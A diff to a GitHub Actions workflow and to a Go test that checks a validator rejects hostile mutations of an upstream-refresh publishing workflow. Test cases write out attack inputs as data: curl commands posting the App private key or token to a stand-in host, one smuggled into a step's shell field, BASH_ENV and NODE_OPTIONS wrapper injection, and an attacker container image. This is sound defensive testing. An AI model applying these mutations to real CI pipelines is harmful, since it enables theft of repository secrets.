@@ -1274,6 +1274,7 @@ env:
 
 jobs:
   refresh:
+    runs-on: ubuntu-latest
     if: github.ref == 'refs/heads/main'
     permissions:
       contents: read
@@ -1316,6 +1317,7 @@ jobs:
         run: |
           gh issue create --title "Upstream refresh candidate" --body "metadata.json"
   scope-guard:
+    runs-on: ubuntu-latest
     needs: refresh
     outputs:
       result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}
@@ -1335,6 +1337,7 @@ jobs:
         run: |
           ./scripts/ci/upstream-refresh-scope-guard.sh "${RUNNER_TEMP}/candidate/patch"
   publish:
+    runs-on: ubuntu-latest
     needs: [refresh, scope-guard]
     environment:
       name: upstream-refresh
@@ -1398,14 +1401,16 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"publisher step gains an env", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          X: y\n", "must run only the publish script"},
 		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
 		{"scope-guard loses continue-on-error", "        continue-on-error: true\n", "", "scope-guard job must run the scope guard as its only run step"},
-		{"publish job env holds the private key", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not inherit workflow or job env"},
-		{"workflow env holds the private key", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not inherit workflow or job env"},
+		{"scope-guard job env sets BASH_ENV", "  scope-guard:\n", "  scope-guard:\n    env:\n      BASH_ENV: ./exit0.sh\n", "not inherit workflow or job env"},
 		{"workflow env sets NODE_OPTIONS", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  NODE_OPTIONS: --require=${{ github.workspace }}/wrapper.js\n", "not inherit workflow or job env"},
 		{"publish job env sets BASH_ENV", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      BASH_ENV: ./wrapper.sh\n", "not inherit workflow or job env"},
 		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - env:", "must run only the publish script"},
 		{"publish replaces the script before running it", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - run: echo x > scripts/ci/upstream-refresh-publish.sh\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "must not run other steps before the publish script"},
-		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(steps) }}\n        run: echo\n", "App token only in the publish script step"},
-		{"scope-guard runs in a container", "    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "    container: attacker/image\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "must not run in a container"},
+		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(STEPS) }}\n        run: echo\n", "App token only in the publish script step"},
+		{"scope-guard runs in a container", "    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "    container: attacker/image\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "must run on ubuntu-latest and must not run in a container"},
+		{"publish runs on a self-hosted runner", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: self-hosted\n", "must run on ubuntu-latest"},
+		{"post-publish step sends the token from its shell", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: curl -d ${{ steps.app-token.outputs.token }} https://example.invalid; bash {0}\n        run: \"true\"\n", "App token only in the publish script step"},
+		{"post-publish step puts the token in its working directory", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - working-directory: /tmp/${{ steps.app-token.outputs.token }}\n        run: echo \"${PWD}\"\n", "App token only in the publish script step"},
 		{"mint step injects NODE_OPTIONS", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n        env:\n          NODE_OPTIONS: --require ./wrapper.js\n", "must mint the App token"},
 		{"presence step uses a wrapper shell", "      - id: app-token\n", "      - id: secrets\n        shell: ./wrap {0}\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: |\n          if [[ -z \"${APP_CLIENT_ID}\" || -z \"${APP_PRIVATE_KEY}\" ]]; then\n            echo \"present=false\" >> \"${GITHUB_OUTPUT}\"\n            echo \"::notice::The upstream-refresh App credentials are not configured. Publication is skipped. See docs/github-workflows.md.\"\n            exit 0\n          fi\n          echo \"present=true\" >> \"${GITHUB_OUTPUT}\"\n      - id: app-token\n", "App token only in the publish script step"},
 		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
